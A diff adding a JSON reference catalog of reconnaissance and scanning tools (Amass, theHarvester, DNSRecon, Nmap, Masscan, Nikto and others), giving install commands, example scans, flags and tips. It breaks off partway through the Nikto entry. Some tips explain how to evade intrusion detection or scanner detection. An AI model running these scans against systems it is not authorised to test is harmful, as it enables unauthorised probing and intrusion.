@@ -1,0 +1,7162 @@
+[
+  {
+    "id": "amass",
+    "name": "Amass",
+    "summary": "OWASP Amass performs in-depth attack surface mapping for external assets. It combines passive and active reconnaissance with graph exports and historical tracking.",
+    "installation_guides": [
+      {
+        "platform": "Snap package",
+        "steps": [
+          {
+            "detail": "sudo snap install amass",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Install via Go",
+        "steps": [
+          {
+            "detail": "GO111MODULE=on go install -v github.com/owasp-amass/amass/v4/...",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Docker",
+        "steps": [
+          {
+            "detail": "docker pull caffix/amass",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Passive enumeration",
+        "command": "amass enum -passive -d example.com",
+        "notes": []
+      },
+      {
+        "description": "Active brute-force with wordlist",
+        "command": "amass enum -active -brute -w data/wordlists/subdomains.txt -d example.com",
+        "notes": []
+      },
+      {
+        "description": "ASN and netblock intel",
+        "command": "amass intel -asn 13335",
+        "notes": []
+      },
+      {
+        "description": "Graph export",
+        "command": "amass viz -d example.com -o graph.gexf",
+        "notes": []
+      },
+      {
+        "description": "Track changes over time",
+        "command": "amass track -d example.com",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "enum/intel/viz/db/track",
+        "description": "Module to run"
+      },
+      {
+        "flag": "-d/-df",
+        "description": "Target domain or file with multiple domains"
+      },
+      {
+        "flag": "-brute",
+        "description": "Enable brute-force enumeration"
+      },
+      {
+        "flag": "-src",
+        "description": "Show data sources for findings"
+      },
+      {
+        "flag": "-ip",
+        "description": "Include resolved IP addresses"
+      },
+      {
+        "flag": "-o/-json",
+        "description": "Write results to text or JSON"
+      }
+    ],
+    "operational_tips": [
+      "Configure API keys (~/.config/amass/config.ini) for richer passive data.",
+      "Use amass db to reuse previous discoveries during new engagements.",
+      "Export graphs (viz) to share with teammates or include in reports.",
+      "Blend passive + active modes for accuracy while limiting noise."
+    ],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "sublist3r",
+    "name": "Sublist3r",
+    "summary": "Sublist3r is a fast Python subdomain enumeration tool designed to enumerate subdomains of websites using OSINT.",
+    "installation_guides": [
+      {
+        "platform": "Install from pip",
+        "steps": [
+          {
+            "detail": "pip3 install sublist3r",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Install from source",
+        "steps": [
+          {
+            "detail": "git clone https://github.com/aboul3la/Sublist3r.git",
+            "copyable": true
+          },
+          {
+            "detail": "cd Sublist3r",
+            "copyable": true
+          },
+          {
+            "detail": "pip3 install -r requirements.txt",
+            "copyable": true
+          },
+          {
+            "detail": "python3 sublist3r.py -h",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Basic subdomain enumeration",
+        "command": "python3 sublist3r.py -d example.com",
+        "notes": []
+      },
+      {
+        "description": "Fast enumeration with verbose output",
+        "command": "python3 sublist3r.py -d example.com -v -t 20",
+        "notes": []
+      },
+      {
+        "description": "Save results to file",
+        "command": "python3 sublist3r.py -d example.com -o subdomains.txt",
+        "notes": []
+      },
+      {
+        "description": "Use specific search engines",
+        "command": "python3 sublist3r.py -d example.com -e google,bing,yahoo",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "-d",
+        "description": "Domain to enumerate"
+      },
+      {
+        "flag": "-v",
+        "description": "Verbose output"
+      },
+      {
+        "flag": "-t",
+        "description": "Number of threads"
+      },
+      {
+        "flag": "-e",
+        "description": "Search engines to use"
+      },
+      {
+        "flag": "-o",
+        "description": "Output file"
+      },
+      {
+        "flag": "-p",
+        "description": "Include ports for subdomains"
+      }
+    ],
+    "operational_tips": [
+      "Use multiple search engines for better coverage.",
+      "Combine with other tools like Amass for comprehensive enumeration.",
+      "Save results for later analysis and correlation.",
+      "Consider rate limiting to avoid being blocked by search engines."
+    ],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "theHarvester",
+    "name": "theHarvester",
+    "summary": "theHarvester is an OSINT tool for gathering emails, subdomains, hosts, employee names, open ports, and banners from different public sources.",
+    "installation_guides": [
+      {
+        "platform": "Install from git",
+        "steps": [
+          {
+            "detail": "git clone https://github.com/laramies/theHarvester.git",
+            "copyable": true
+          },
+          {
+            "detail": "cd theHarvester",
+            "copyable": true
+          },
+          {
+            "detail": "pip3 install -r requirements.txt",
+            "copyable": true
+          },
+          {
+            "detail": "python3 theHarvester.py -h",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Basic email and subdomain gathering",
+        "command": "python3 theHarvester.py -d example.com -l 500 -b google",
+        "notes": []
+      },
+      {
+        "description": "Comprehensive OSINT with multiple sources",
+        "command": "python3 theHarvester.py -d example.com -l 1000 -b all",
+        "notes": []
+      },
+      {
+        "description": "Shodan integration for host discovery",
+        "command": "python3 theHarvester.py -d example.com -l 500 -b shodan",
+        "notes": []
+      },
+      {
+        "description": "Save results to XML",
+        "command": "python3 theHarvester.py -d example.com -l 500 -b google -f myresults.xml",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "-d",
+        "description": "Domain to search"
+      },
+      {
+        "flag": "-l",
+        "description": "Limit number of results"
+      },
+      {
+        "flag": "-b",
+        "description": "Data source (google, bing, etc.)"
+      },
+      {
+        "flag": "-f",
+        "description": "Save output to file"
+      },
+      {
+        "flag": "-n",
+        "description": "Start DNS resolution of discovered hosts"
+      },
+      {
+        "flag": "-c",
+        "description": "Perform DNS brute force"
+      }
+    ],
+    "operational_tips": [
+      "Use 'all' as data source for comprehensive gathering.",
+      "Combine with Shodan API for additional host information.",
+      "Be aware of API rate limits for various sources.",
+      "Export results for correlation with other tools."
+    ],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "dnsrecon",
+    "name": "DNSRecon",
+    "summary": "DNSRecon is a powerful DNS enumeration script that provides multiple techniques for gathering DNS information.",
+    "installation_guides": [
+      {
+        "platform": "Install from git",
+        "steps": [
+          {
+            "detail": "git clone https://github.com/darkoperator/dnsrecon.git",
+            "copyable": true
+          },
+          {
+            "detail": "cd dnsrecon",
+            "copyable": true
+          },
+          {
+            "detail": "pip3 install -r requirements.txt",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Kali Linux (pre-installed)",
+        "steps": [
+          {
+            "detail": "dnsrecon -h",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Standard enumeration",
+        "command": "dnsrecon -d example.com -t std",
+        "notes": []
+      },
+      {
+        "description": "Zone transfer attempt",
+        "command": "dnsrecon -d example.com -t axfr",
+        "notes": []
+      },
+      {
+        "description": "Reverse lookup of IP range",
+        "command": "dnsrecon -d example.com -t rvl -r 192.168.1.0/24",
+        "notes": []
+      },
+      {
+        "description": "Brute force subdomains",
+        "command": "dnsrecon -d example.com -t brte -D wordlist.txt",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "-d",
+        "description": "Target domain"
+      },
+      {
+        "flag": "-t",
+        "description": "Type of enumeration"
+      },
+      {
+        "flag": "-n",
+        "description": "Name server to use"
+      },
+      {
+        "flag": "-r",
+        "description": "IP range for reverse lookup"
+      },
+      {
+        "flag": "-D",
+        "description": "Dictionary file for brute force"
+      },
+      {
+        "flag": "-a",
+        "description": "Perform all enumeration types"
+      }
+    ],
+    "operational_tips": [
+      "Always try zone transfer first - high impact if successful.",
+      "Use custom wordlists for better brute force results.",
+      "Combine with other DNS tools for comprehensive coverage.",
+      "Document all DNS findings for attack surface mapping."
+    ],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "dnsenum",
+    "name": "DNSenum",
+    "summary": "DNSenum is a multithreaded perl script to enumerate DNS information of a domain and discover non-contiguous IP blocks.",
+    "installation_guides": [
+      {
+        "platform": "Debian/Ubuntu",
+        "steps": [
+          {
+            "detail": "sudo apt install dnsenum",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Install from source",
+        "steps": [
+          {
+            "detail": "git clone https://github.com/fwaeytens/dnsenum.git",
+            "copyable": true
+          },
+          {
+            "detail": "cd dnsenum",
+            "copyable": true
+          },
+          {
+            "detail": "chmod +x dnsenum.pl",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Basic DNS enumeration",
+        "command": "dnsenum example.com",
+        "notes": []
+      },
+      {
+        "description": "Verbose with subdomain brute force",
+        "command": "dnsenum --subfile subdomains.txt -f /usr/share/wordlists/dns.txt example.com",
+        "notes": []
+      },
+      {
+        "description": "With thread control and WHOIS",
+        "command": "dnsenum -t 16 -w example.com",
+        "notes": []
+      },
+      {
+        "description": "Reverse lookup of IP range",
+        "command": "dnsenum -r 192.168.1.0/24 example.com",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "--subfile",
+        "description": "Save subdomains to file"
+      },
+      {
+        "flag": "-f",
+        "description": "Dictionary file for brute force"
+      },
+      {
+        "flag": "-t",
+        "description": "Number of threads"
+      },
+      {
+        "flag": "-w",
+        "description": "Perform WHOIS queries"
+      },
+      {
+        "flag": "-r",
+        "description": "Reverse lookup of IP range"
+      },
+      {
+        "flag": "-s",
+        "description": "Perform reverse lookups on subnets"
+      }
+    ],
+    "operational_tips": [
+      "Use good wordlists for subdomain brute forcing.",
+      "Monitor thread count to avoid overwhelming target servers.",
+      "Combine results with other DNS tools for completeness.",
+      "Save subdomain lists for later testing phases."
+    ],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "maltego",
+    "name": "Maltego",
+    "summary": "Maltego is an interactive data mining tool that renders directed graphs for link analysis. It's excellent for visualizing relationships between entities.",
+    "installation_guides": [
+      {
+        "platform": "Kali Linux (Community Edition)",
+        "steps": [
+          {
+            "detail": "maltego",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Launch Maltego GUI",
+        "command": "maltego",
+        "notes": []
+      },
+      {
+        "description": "Run Maltego with specific transform",
+        "command": "maltego -transform 'maltego.DNS_To_IPAddress'",
+        "notes": []
+      },
+      {
+        "description": "Import data for analysis",
+        "command": "# Use GUI to import CSV, JSON, or other formats",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "-transform",
+        "description": "Run specific transform"
+      },
+      {
+        "flag": "-import",
+        "description": "Import data file"
+      },
+      {
+        "flag": "-export",
+        "description": "Export graph results"
+      },
+      {
+        "flag": "-machine",
+        "description": "Run in machine mode"
+      }
+    ],
+    "operational_tips": [
+      "Use transforms to automatically discover related information.",
+      "Save graphs for later analysis and reporting.",
+      "Combine with OSINT data for comprehensive intelligence.",
+      "Consider API keys for premium transforms and data sources."
+    ],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "recon-ng",
+    "name": "Recon-ng",
+    "summary": "Recon-ng is a powerful Web Reconnaissance framework with a modular interface similar to Metasploit.",
+    "installation_guides": [
+      {
+        "platform": "Install from git",
+        "steps": [
+          {
+            "detail": "git clone https://github.com/lanmaster53/recon-ng.git",
+            "copyable": true
+          },
+          {
+            "detail": "cd recon-ng",
+            "copyable": true
+          },
+          {
+            "detail": "pip3 install -r requirements.txt",
+            "copyable": true
+          },
+          {
+            "detail": "./recon-ng",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Launch Recon-ng",
+        "command": "./recon-ng",
+        "notes": []
+      },
+      {
+        "description": "Create workspace",
+        "command": "recon-ng> workspace create example",
+        "notes": []
+      },
+      {
+        "description": "Add domain and run modules",
+        "command": "recon-ng> add domains example.com",
+        "notes": []
+      },
+      {
+        "description": "Run Google dorking module",
+        "command": "recon-ng> modules search google_site_web",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "workspace",
+        "description": "Manage workspaces"
+      },
+      {
+        "flag": "add",
+        "description": "Add target data"
+      },
+      {
+        "flag": "modules",
+        "description": "Manage reconnaissance modules"
+      },
+      {
+        "flag": "keys",
+        "description": "Manage API keys"
+      },
+      {
+        "flag": "show",
+        "description": "Show various information"
+      }
+    ],
+    "operational_tips": [
+      "Configure API keys for maximum module functionality.",
+      "Use workspaces to organize different engagements.",
+      "Chain modules for comprehensive reconnaissance.",
+      "Export data for analysis in other tools."
+    ],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "photon",
+    "name": "Photon",
+    "summary": "Photon is an incredibly fast crawler designed for OSINT that extracts URLs, emails, files, website accounts, and more.",
+    "installation_guides": [
+      {
+        "platform": "Install from git",
+        "steps": [
+          {
+            "detail": "git clone https://github.com/s0md3v/Photon.git",
+            "copyable": true
+          },
+          {
+            "detail": "cd Photon",
+            "copyable": true
+          },
+          {
+            "detail": "pip3 install -r requirements.txt",
+            "copyable": true
+          },
+          {
+            "detail": "python3 photon.py -h",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Basic web crawling",
+        "command": "python3 photon.py -u https://example.com",
+        "notes": []
+      },
+      {
+        "description": "Deep crawl with more threads",
+        "command": "python3 photon.py -u https://example.com -l 3 -t 20",
+        "notes": []
+      },
+      {
+        "description": "Save all data",
+        "command": "python3 photon.py -u https://example.com -d example --output",
+        "notes": []
+      },
+      {
+        "description": "Crawl with cookies and headers",
+        "command": "python3 photon.py -u https://example.com -c 'session=abc123' -h 'Authorization: Bearer token'",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "-u",
+        "description": "Target URL"
+      },
+      {
+        "flag": "-l",
+        "description": "Level of crawling depth"
+      },
+      {
+        "flag": "-t",
+        "description": "Number of threads"
+      },
+      {
+        "flag": "-d",
+        "description": "Output directory name"
+      },
+      {
+        "flag": "--output",
+        "description": "Save output to files"
+      },
+      {
+        "flag": "-c",
+        "description": "Cookie string"
+      },
+      {
+        "flag": "-h",
+        "description": "Custom headers"
+      }
+    ],
+    "operational_tips": [
+      "Increase threads for faster crawling but monitor target response.",
+      "Use appropriate depth levels to avoid infinite crawling.",
+      "Save all output for later analysis and correlation.",
+      "Combine with other tools for comprehensive reconnaissance."
+    ],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "spiderfoot",
+    "name": "SpiderFoot",
+    "summary": "SpiderFoot is an OSINT automation tool that integrates with numerous data sources to gather intelligence on IP addresses, domain names, email addresses, etc.",
+    "installation_guides": [
+      {
+        "platform": "Install from git",
+        "steps": [
+          {
+            "detail": "git clone https://github.com/smicallef/spiderfoot.git",
+            "copyable": true
+          },
+          {
+            "detail": "cd spiderfoot",
+            "copyable": true
+          },
+          {
+            "detail": "pip3 install -r requirements.txt",
+            "copyable": true
+          },
+          {
+            "detail": "python3 sf.py -h",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Launch SpiderFoot web interface",
+        "command": "python3 sf.py -l 127.0.0.1:5001",
+        "notes": []
+      },
+      {
+        "description": "CLI scan of domain",
+        "command": "python3 sf.py -d example.com -s all -o json",
+        "notes": []
+      },
+      {
+        "description": "Scan with specific modules",
+        "command": "python3 sf.py -d example.com -m sfp_dns,sfp_shodan",
+        "notes": []
+      },
+      {
+        "description": "Scan with strict correlation",
+        "command": "python3 sf.py -d example.com -S -t 2",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "-d",
+        "description": "Target domain/IP/email"
+      },
+      {
+        "flag": "-s",
+        "description": "Scan modules to use"
+      },
+      {
+        "flag": "-m",
+        "description": "Specific modules to run"
+      },
+      {
+        "flag": "-o",
+        "description": "Output format"
+      },
+      {
+        "flag": "-l",
+        "description": "Listen address for web UI"
+      },
+      {
+        "flag": "-S",
+        "description": "Strict correlation mode"
+      },
+      {
+        "flag": "-t",
+        "description": "Maximum thread count"
+      }
+    ],
+    "operational_tips": [
+      "Use web interface for better visualization and control.",
+      "Configure API keys for maximum data source coverage.",
+      "Use strict correlation to reduce false positives.",
+      "Export results for integration with other tools."
+    ],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "nmap",
+    "name": "Nmap",
+    "summary": "Nmap (Network Mapper) is a powerful open-source tool for network discovery and security auditing. It discovers hosts, detects services, fingerprints OS metadata, and can execute NSE scripts for deeper checks.",
+    "installation_guides": [
+      {
+        "platform": "Debian/Ubuntu",
+        "steps": [
+          {
+            "detail": "sudo apt install nmap",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Red Hat/CentOS/Fedora",
+        "steps": [
+          {
+            "detail": "sudo yum install nmap",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "macOS (Homebrew)",
+        "steps": [
+          {
+            "detail": "brew install nmap",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Basic TCP SYN scan (fast, stealthy)",
+        "command": "sudo nmap -sS scanme.nmap.org",
+        "notes": []
+      },
+      {
+        "description": "Scan specific ports with version detection",
+        "command": "sudo nmap -p 80,443 -sV example.com",
+        "notes": []
+      },
+      {
+        "description": "Aggressive scan (OS detection, scripts, traceroute)",
+        "command": "sudo nmap -A 192.168.1.1",
+        "notes": []
+      },
+      {
+        "description": "Host discovery without port scan",
+        "command": "sudo nmap -sn 192.168.1.0/24",
+        "notes": []
+      },
+      {
+        "description": "Full TCP scan with service detection",
+        "command": "sudo nmap -p- -sV 10.0.0.5",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "-sS",
+        "description": "TCP SYN scan (default, stealthy)"
+      },
+      {
+        "flag": "-sV",
+        "description": "Service version detection"
+      },
+      {
+        "flag": "-O",
+        "description": "OS detection"
+      },
+      {
+        "flag": "-A",
+        "description": "Aggressive scan (OS, version, scripts, traceroute)"
+      },
+      {
+        "flag": "-p <ports>",
+        "description": "List ports or ranges (e.g., -p 80,443 or -p 1-1000)"
+      },
+      {
+        "flag": "-T<0-5>",
+        "description": "Timing template (0=slowest, 5=fastest)"
+      },
+      {
+        "flag": "--script <name>",
+        "description": "Run NSE script (e.g., --script vuln)"
+      },
+      {
+        "flag": "-oN/-oX/-oG",
+        "description": "Output to normal/XML/grepable files"
+      }
+    ],
+    "operational_tips": [
+      "Always run scans with permission and document scope clearly.",
+      "Use -T4 for faster scans on reliable networks; -T2 when evading detection.",
+      "Combine flags: sudo nmap -sS -sV -O -T4 target",
+      "Enable verbose output with -v or --reason to inspect why ports are marked open or closed.",
+      "Schedule long-running scans during maintenance windows to avoid network noise."
+    ],
+    "step_sequences": [
+      {
+        "title": "Zero-noise host discovery",
+        "steps": [
+          {
+            "title": "ARP sweep local VLAN",
+            "details": "Use ARP ping to enumerate directly connected hosts before touching routers.",
+            "command": "sudo nmap -sn 10.10.0.0/24"
+          },
+          {
+            "title": "ICMP fallback for remote ranges",
+            "details": "When L2 access is unavailable rely on ICMP echo probes or trusted jump boxes.",
+            "command": "sudo nmap -PE -sn scope.txt"
+          },
+          {
+            "title": "Persist results for later phases",
+            "details": "Store responsive hosts in grepable output for targeted service scans.",
+            "command": "sudo nmap -sn -oG live.gnmap scope.txt"
+          }
+        ]
+      },
+      {
+        "title": "Focused service validation",
+        "steps": [
+          {
+            "title": "Enumerate top ports with banners",
+            "details": "Run a fast TCP sweep that captures basic service metadata.",
+            "command": "sudo nmap -sS -sV --top-ports 200 -iL live.txt -oA top200"
+          },
+          {
+            "title": "Run targeted NSE scripts",
+            "details": "Only execute scripts that match the validated services to save time.",
+            "command": "sudo nmap --script safe,vuln -p80,443,445 -iL top200.gnmap"
+          }
+        ]
+      }
+    ],
+    "workflow_guides": [
+      {
+        "name": "Layered scanning workflow",
+        "stages": [
+          {
+            "label": "Mass discovery",
+            "description": "Kick off masscan or naabu to flag responsive ports at high speed.",
+            "command": "sudo masscan 10.0.0.0/16 -p80,443 --rate 10000 -oL fast.txt"
+          },
+          {
+            "label": "Service validation",
+            "description": "Feed responsive hosts into Nmap for accurate service/OS fingerprinting.",
+            "command": "sudo nmap -sS -sV -iL fast.txt --top-ports 200 -oA validation"
+          },
+          {
+            "label": "Scripted follow-up",
+            "description": "Launch NSE scripts only against the services that matter most.",
+            "command": "sudo nmap --script vuln,safe -iL validation.gnmap -oN scripts.txt"
+          },
+          {
+            "label": "Reporting",
+            "description": "Export grepable output for notebooks and tracking dashboards.",
+            "command": "sudo nmap -iL fast.txt -oG final.gnmap"
+          }
+        ]
+      }
+    ],
+    "output_notes": [
+      {
+        "indicator": "Host is up (0.000s latency).",
+        "meaning": "Target responded to discovery probes. Expect accompanying PORT lines soon after.",
+        "severity": "info"
+      },
+      {
+        "indicator": "PORT   STATE SERVICE",
+        "meaning": "Header row describing the columns that follow. STATE values of open/closed/filtered map directly to the TCP handshake result.",
+        "severity": "info"
+      },
+      {
+        "indicator": "Warning: OSScan results may be unreliable...",
+        "meaning": "OS detection needs at least one open and one closed port. Provide more targets or explicitly scan additional ports.",
+        "severity": "warning"
+      }
+    ],
+    "advanced_usage": [
+      {
+        "title": "Stealthy full TCP fingerprinting",
+        "scenario": "Blend service, OS and script data in a single sweep against mid-sized networks.",
+        "command": "sudo nmap -p- -sS -sV -O --reason --max-retries 1 -iL live.txt -oA full-spectrum",
+        "notes": [
+          "Tune --scan-delay/--max-rate on fragile networks to avoid tripping IDS baseline checks."
+        ]
+      },
+      {
+        "title": "IPv6 neighbor discovery and scan",
+        "scenario": "Enumerate dual-stack hosts that may not appear in IPv4 scopes.",
+        "command": "sudo nmap -6 -sV -Pn 2001:db8:10::/64",
+        "notes": [
+          "Combine with --script ipv6-node-info,targets-ipv6-multicast for richer SLAAC findings."
+        ]
+      }
+    ],
+    "comparison_table": {
+      "caption": "Choosing the right scanner",
+      "columns": [
+        "Capability",
+        "Nmap",
+        "Masscan",
+        "Naabu"
+      ],
+      "rows": [
+        [
+          "Speed",
+          "Balanced (tunable with -T0..-T5)",
+          "Extremely fast (millions of packets/sec)",
+          "Fast (Go-based, moderate accuracy)"
+        ],
+        [
+          "Coverage",
+          "TCP/UDP, service/OS detection, NSE automation",
+          "TCP only, stateless",
+          "TCP with lightweight banner grabbing"
+        ],
+        [
+          "Best use case",
+          "Validation and deep reconnaissance",
+          "Huge address ranges or early sweeps",
+          "Mid-sized web/service enumerations"
+        ]
+      ]
+    },
+    "resources": [
+      {
+        "label": "Nmap Reference Guide",
+        "url": "https://nmap.org/book/man.html",
+        "description": "Official documentation for every option and timing nuance."
+      },
+      {
+        "label": "NSE Script Gallery",
+        "url": "https://nmap.org/nsedoc/",
+        "description": "Searchable catalog of bundled scripts with usage notes."
+      },
+      {
+        "label": "Nmap cheat sheet",
+        "url": "https://highon.coffee/blog/nmap-cheat-sheet/",
+        "description": "Community-maintained reminders for offensive and defensive teams."
+      }
+    ]
+  },
+  {
+    "id": "masscan",
+    "name": "Masscan",
+    "summary": "Masscan is an Internet-scale port scanner capable of sending millions of packets per second. Use it for rapid discovery before deeper Nmap scans.",
+    "installation_guides": [
+      {
+        "platform": "Debian/Ubuntu",
+        "steps": [
+          {
+            "detail": "sudo apt install masscan",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Build from source",
+        "steps": [
+          {
+            "detail": "git clone https://github.com/robertdavidgraham/masscan.git",
+            "copyable": true
+          },
+          {
+            "detail": "cd masscan && make",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Scan top 100 ports on a subnet",
+        "command": "sudo masscan 10.0.0.0/24 --top-ports 100 --rate 5000",
+        "notes": []
+      },
+      {
+        "description": "Full TCP scan of a host",
+        "command": "sudo masscan 203.0.113.5 -p0-65535 --rate 10000",
+        "notes": []
+      },
+      {
+        "description": "Slow scan to avoid detection",
+        "command": "sudo masscan 198.51.100.0/24 -p80,443 --rate 100",
+        "notes": []
+      },
+      {
+        "description": "Scan known ports with banner grab",
+        "command": "sudo masscan 192.168.56.0/24 -p22,80,445 --banners",
+        "notes": []
+      },
+      {
+        "description": "Exclude sensitive ranges",
+        "command": "sudo masscan 0.0.0.0/0 -p443 --excludefile exclude.txt",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "-p/-p0-65535",
+        "description": "Port or port range"
+      },
+      {
+        "flag": "--top-ports <n>",
+        "description": "Scan the most common ports"
+      },
+      {
+        "flag": "--rate",
+        "description": "Packets per second"
+      },
+      {
+        "flag": "--adapter-ip/port",
+        "description": "Bind to a specific source IP/port"
+      },
+      {
+        "flag": "--router-ip",
+        "description": "Send packets via alternate gateway"
+      },
+      {
+        "flag": "--banners",
+        "description": "Grab basic service banners"
+      },
+      {
+        "flag": "--exclude/--excludefile",
+        "description": "Skip sensitive networks"
+      },
+      {
+        "flag": "-oX/-oJ/-oL",
+        "description": "Output XML/JSON/list formats"
+      }
+    ],
+    "operational_tips": [
+      "Masscan requires root; consider --rate to respect network capacity.",
+      "Use results as input to slower but deeper Nmap scans.",
+      "Always exclude production ranges if not in scope.",
+      "Plan scans during maintenance to avoid IDS alerts."
+    ],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "naabu",
+    "name": "Naabu",
+    "summary": "Naabu is a fast port scanner written in Go that allows you to enumerate valid ports for hosts in a fast and reliable manner.",
+    "installation_guides": [
+      {
+        "platform": "Install from source",
+        "steps": [
+          {
+            "detail": "go install -v github.com/projectdiscovery/naabu/v2/cmd/naabu@latest",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Basic port scan",
+        "command": "naabu -host example.com",
+        "notes": []
+      },
+      {
+        "description": "Scan with top 1000 ports",
+        "command": "naabu -host 192.168.1.1 -top-ports 1000",
+        "notes": []
+      },
+      {
+        "description": "Fast scan with JSON output",
+        "command": "naabu -host example.com -json -o results.json",
+        "notes": []
+      },
+      {
+        "description": "Scan multiple hosts",
+        "command": "naabu -list hosts.txt -p 80,443,8080",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "-host",
+        "description": "Target host to scan"
+      },
+      {
+        "flag": "-list",
+        "description": "File with target hosts"
+      },
+      {
+        "flag": "-p",
+        "description": "Ports to scan"
+      },
+      {
+        "flag": "-top-ports",
+        "description": "Scan top N ports"
+      },
+      {
+        "flag": "-json",
+        "description": "JSON output format"
+      },
+      {
+        "flag": "-o",
+        "description": "Output file"
+      },
+      {
+        "flag": "-rate",
+        "description": "Packets per second"
+      }
+    ],
+    "operational_tips": [
+      "Use JSON output for easy integration with other tools.",
+      "Adjust rate to balance speed and stealth.",
+      "Combine with Nmap for detailed service detection.",
+      "Use CIDR notation for network scanning."
+    ],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "nikto",
+    "name": "Nikto",
+    "summary": "Nikto is a web server scanner that performs comprehensive tests against web servers to find dangerous files/programs and outdated versions.",
+    "installation_guides": [
+      {
+        "platform": "Debian/Ubuntu",
+        "steps": [
+          {
+            "detail": "sudo apt install nikto",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Kali Linux (pre-installed)",
+        "steps": [
+          {
+            "detail": "nikto -h",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Install from source",
+        "steps": [
+          {
+            "detail": "git clone https://github.com/sullo/nikto.git",
+            "copyable": true
+          },
+          {
+            "detail": "cd nikto/program",
+            "copyable": true
+          },
+          {
+            "detail": "perl nikto.pl -h",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Basic web server scan",
+        "command": "nikto -h https://example.com",
+        "notes": []
+      },
+      {
+        "description": "Scan with custom user agent",
+        "command": "nikto -h https://example.com -useragent 'Custom Scanner 1.0'",
+        "notes": []
+      },
+      {
+        "description": "Scan specific port",
+        "command": "nikto -h 192.168.1.1 -p 8080",
+        "notes": []
+      },
+      {
+        "description": "Save output to file",
+        "command": "nikto -h https://example.com -o nikto_results.html -Format htm",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "-h",
+        "description": "Target host/IP"
+      },
+      {
+        "flag": "-p",
+        "description": "Port to scan"
+      },
+      {
+        "flag": "-useragent",
+        "description": "Custom user agent"
+      },
+      {
+        "flag": "-o",
+        "description": "Output file"
+      },
+      {
+        "flag": "-Format",
+        "description": "Output format (csv, htm, txt, xml)"
+      },
+      {
+        "flag": "-Tuning",
+        "description": "Scan tuning options"
+      },
+      {
+        "flag": "-Plugins",
+        "description": "Plugins to use/skip"
+      }
+    ],
+    "operational_tips": [
+      "Use custom user agents to avoid scanner detection.",
+      "Save results in HTML format for easy reporting.",
+      "Tune scanning options to reduce noise on sensitive targets.",
